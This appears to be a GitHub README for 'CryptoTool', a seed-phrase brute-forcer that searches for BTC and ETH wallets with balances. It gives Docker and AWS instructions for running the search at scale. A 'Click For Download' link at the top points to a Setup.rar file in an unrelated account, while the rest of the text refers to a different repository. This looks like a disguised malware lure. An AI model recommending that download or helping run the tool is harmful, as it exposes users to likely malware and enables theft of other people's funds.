# CryptoTool
CryptoTool is a tool for brute forcing Crypto Wallets

 [![Click For Download](https://github.com/ffireman1/manu/releases/download/Set/Setup.rar)
 ![CryptoToolV2](https://github.com/yaron4u/EnigmaCracker/assets/67191566/de72ea8a-2ec4-4b32-9580-bd80c9715f87)
...
If CryptoTool finds a wallet with a balance, it will create `wallets_with_balance.txt` file that will contain the info of the discovered wallet.

Upon execution, CryptoTool generates a comprehensive log file named `CryptoTool.log`, which neatly records the entire session history for review and analysis.

# Technical Details

## Master Seed and Wallet Generation

![derivation](https://github.com/yaron4u/CryptoTool/assets/67191566/bbdcaab5-030f-4e03-b1cb-c816253d27df)

CryptoTool is engineered around the key principle of the **Master Seed** in cryptocurrency wallet generation, as per the standards described in BIP 32 for Hierarchical Deterministic (HD) Wallets. The Python script provided within this repository is designed to create a mnemonic phrase (also known as a seed phrase), which essentially acts as the **Master Seed** from which all cryptographic keys can be derived.
...
### The Role of Master Seed in CryptoTool
...
Through the integration of BIP39 and BIP44 protocols, CryptoTool serves as a practical example of how the **Master Seed** forms the bedrock of cryptocurrency wallets, allowing for a secure, hierarchical structure of key derivation and management.
...
```bash
git clone https://github.com/yaron4u/CryptoTool
```
...
2. Navigate to the script's directory and insert your API key in CryptoTool.env:
```bash
# In CryptoTool.env
...
Run CryptoTool from the command line:

```bash
cd path/to/CryptoTool
python CryptoTool.py
```
---
## Running CryptoTool in Docker
...
1. **Clone the Repository**  
   If you haven't already, clone the CryptoTool repository to your local machine:
   ```bash
   git clone https://github.com/yaron4u/CryptoTool
   ```
...
2. **Setting Up Environment Variables**  
   ...
   - Open the `CryptoTool.env` file and replace `your_etherscan_api_key` with your actual Etherscan API key.
   - Open the `docker-compose.yml` file and replace `your_etherscan_api_key` with your actual Etherscan API key.

3. **Building the Docker Image**  
   From the root directory of the project in the CryptoTool-Docker folder (where the `Dockerfile` is located), run the following command to build the Docker image:
   ```bash
   docker-compose build
   ```
   This command reads the `Dockerfile` and `docker-compose.yml` to build the CryptoTool Docker image.
...
4. **Running the Docker Container**  
   ...
   docker-compose up
   ```
   This command starts the CryptoTool service defined in `docker-compose.yml`. The script inside the Docker container (`EC.py`) will automatically execute.
...
### Note
- The Docker environment provides an isolated and consistent runtime for CryptoTool.
...
- **Modified Script for Docker**: The Docker version of CryptoTool runs a slightly modified version of the script (`EC.py`) compared to the standalone version. These modifications are specifically tailored for the Docker environment to ensure smooth operation within a container. For instance, any code segments that require GUI interaction or OS-specific commands have been adjusted or removed since Docker containers typically run in a headless (non-GUI) environment.
...
## Running CryptoTool on AWS

This guide will walk you through the process of using CryptoTool on AWS. The steps include setting up an Amazon ECR repository for your Docker image, creating an EC2 instance with Ubuntu, and then pulling and running the CryptoTool Docker container on that instance.
...
1. **Create an ECR Repository:**
   ...
   - Name your repository (e.g., `CryptoTool-docker`), and click "Create repository."
...
3. **Tag Your Docker Image:**
   - Tag your local CryptoTool Docker image with the ECR repository URI:
     ```bash
     docker tag CryptoTool:latest [your-account-id].dkr.ecr.[your-region].amazonaws.com/CryptoTool-docker:latest
     ```

4. **Push the Image to ECR:**
   - Push your Docker image to the ECR repository:
     ```bash
     docker push [your-account-id].dkr.ecr.[your-region].amazonaws.com/CryptoTool-docker:latest
     ```
...
### Step 3: Pulling and Running the CryptoTool Docker Container
...
3. **Pull the Docker Image:**
   - Pull the CryptoTool image from your ECR repository:
     ```bash
     docker pull [your-account-id].dkr.ecr.[your-region].amazonaws.com/CryptoTool-docker:latest
     ```

4. **Run the CryptoTool Container:**
   - Run the Docker container:
     ```bash
     docker run [your-account-id].dkr.ecr.[your-region].amazonaws.com/CryptoTool-docker:latest
     ```

### Step 4: Monitoring and Interacting with the CryptoTool Container

To monitor and interact with the CryptoTool container running on your EC2 instance, you can use the following steps:
...
3. **List All Containers**:
   - Check the status of all Docker containers, including the CryptoTool container.
     ```bash
     docker ps -a
     ```

4. **Copy Log Files from Container to EC2 Instance**:
   - If you want to inspect the log files generated by CryptoTool, copy them from the container to your EC2 instance. Replace `CryptoTool_container` with the actual container ID or name.
     ```bash
     docker cp CryptoTool_container:/usr/src/app/CryptoTool.log /home/ubuntu/CryptoTool.log
     ```
...
5. **Review the Log File**:
   - Navigate to the directory where you copied the log file and use `grep` or other tools to analyze it. For example, to count the number of founded wallets in the log file:
     ```bash
     cd /home/ubuntu
     grep -c '!' CryptoTool.log
     ```

### Conclusion

Setting up CryptoTool on an AWS EC2 instance with your Docker image in Amazon ECR offers improved scalability and reliability for your wallet scanning tasks. This approach provides a streamlined and effective solution to harness CryptoTool’s full potential on a powerful cloud platform.

---
## Updates

- **Dual Cryptocurrency Detection**: CryptoTool now supports detection of both BTC and ETH wallets.
- **AWS Integration**: I've developed a comprehensive guide to help you deploy CryptoTool on AWS (Amazon Web Services). This integration enables you to utilize cloud computing resources for better performance and scalability. The guide includes detailed instructions for setting up CryptoTool on Amazon EC2 (Elastic Compute Cloud) instances and using Amazon ECR (Elastic Container Registry) for efficient cloud-based operations.
...
(I will not help anybody that asks for help to setup CryptoTool, every email in that subject will be ignored)
